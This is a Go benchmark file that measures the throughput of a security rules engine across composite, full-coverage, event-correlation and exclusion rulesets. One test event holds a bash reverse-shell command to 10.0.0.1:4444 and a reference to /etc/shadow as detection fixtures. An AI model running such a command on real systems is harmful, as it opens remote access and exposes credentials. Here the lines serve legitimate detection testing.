package rules_engine

// Aggregate TPS benchmark for the rules engine.
//
// The benchmark intentionally exposes a single entrypoint so `-benchtime`
// controls the total runtime for the whole mixed workload instead of being
// split across multiple benchmark functions or subtests.
//
// Workload mix:
//   - composite ruleset
//   - full coverage ruleset
//   - complex CEP ruleset
//   - exclude ruleset
//
// Each benchmark iteration processes exactly one event. Rulesets are built once
// before the timer starts, then the benchmark rotates across all scenarios and
// their event batches, reporting a single overall `evt/s` number.
//
// Requires CGO + librure. From repo root:
//
//   cd src && CGO_ENABLED=1 CGO_LDFLAGS="-L../lib/darwin -lrure" \
//     go test ./rules_engine -run='^$' -bench='^BenchmarkRulesEngineTPS$' -benchtime=5m -count=1 -benchmem

import "testing"

type rulesEngineTPSScenario struct {
	rs     *Ruleset
	events []map[string]interface{}
	idx    int
}

func (s *rulesEngineTPSScenario) warmup() {
	for _, ev := range s.events {
		_ = s.rs.EngineCheck(cloneEventForReplay(ev))
	}
}

func (s *rulesEngineTPSScenario) runOne() {
	ev := s.events[s.idx%len(s.events)]
	s.idx++
	_ = s.rs.EngineCheck(cloneEventForReplay(ev))
}

func reportTPS(b *testing.B) {
	b.Helper()
	sec := b.Elapsed().Seconds()
	if sec <= 0 {
		return
	}
	b.ReportMetric(float64(b.N)/sec, "evt/s")
}

func benchmarkFullCoverageGoldenEvent() map[string]interface{} {
	return map[string]interface{}{
		"channel":    "security",
		"dropped":    "false",
		"cmd":        "bash -i >&/dev/tcp/10.0.0.1/4444 0>&1",
		"referer":    "https://example.com/index.html",
		"path":       "/etc/shadow",
		"filename":   "sshd.conf",
		"action":     "LOGIN",
		"message":    "ALERT: suspicious outbound connection",
		"event_id":   "ev-001",
		"meta":       map[string]interface{}{"env": "production"},
		"src":        "10.0.0.1",
		"dst":        "10.0.0.1",
		"url":        "/api/v1/admin/users",
		"risk_score": 85,
		"bytes":      4096,
		"actor":      "alice",
		"port":       4444,
		"event_type": "login",
		"_drop_me":   "scratch",
		"tags":       []interface{}{"audit", "critical", "network"},
		"items": []interface{}{
			map[string]interface{}{"v": 2},
			map[string]interface{}{"v": 7},
		},
		"user_type":    "guest",
		"extension":    ".txt",
		"outcome":      "FAILURE",
		"detail":       "normal ops",
		"method":       "GET",
		"content_type": "application/json",
		"host":         "internal.corp",
		"accept":       "text/html",
	}
}

func loadRulesEngineTPSScenarios(b *testing.B) []*rulesEngineTPSScenario {
	b.Helper()

	fullCoverageBatch := loadEventsFromTestdataJSON(b, "events/full_coverage_events.json")
	fullCoverageEvents := make([]map[string]interface{}, 0, len(fullCoverageBatch)+1)
	fullCoverageEvents = append(fullCoverageEvents, benchmarkFullCoverageGoldenEvent())
	fullCoverageEvents = append(fullCoverageEvents, fullCoverageBatch...)

	scenarios := []*rulesEngineTPSScenario{
		{
			rs:     loadBuiltRulesetFromTestdata(b, "rulesets/tps_composite.xml"),
			events: loadEventsFromTestdataJSON(b, "events/tps_composite_events.json"),
		},
		{
			rs:     loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage.xml"),
			events: fullCoverageEvents,
		},
		{
			rs:     loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage_cep.xml"),
			events: loadEventsFromTestdataJSONL(b, "events/full_coverage_cep_events.jsonl"),
		},
		{
			rs:     loadBuiltRulesetFromTestdata(b, "rulesets/full_coverage_exclude.xml"),
			events: loadEventsFromTestdataJSON(b, "events/full_coverage_exclude_events.json"),
		},
	}

	for _, scenario := range scenarios {
		scenario.warmup()
	}

	return scenarios
}

func BenchmarkRulesEngineTPS(b *testing.B) {
	scenarios := loadRulesEngineTPSScenarios(b)

	b.ReportAllocs()
	b.ResetTimer()

	i := 0
	for b.Loop() {
		scenarios[i%len(scenarios)].runOne()
		i++
	}

	reportTPS(b)
}
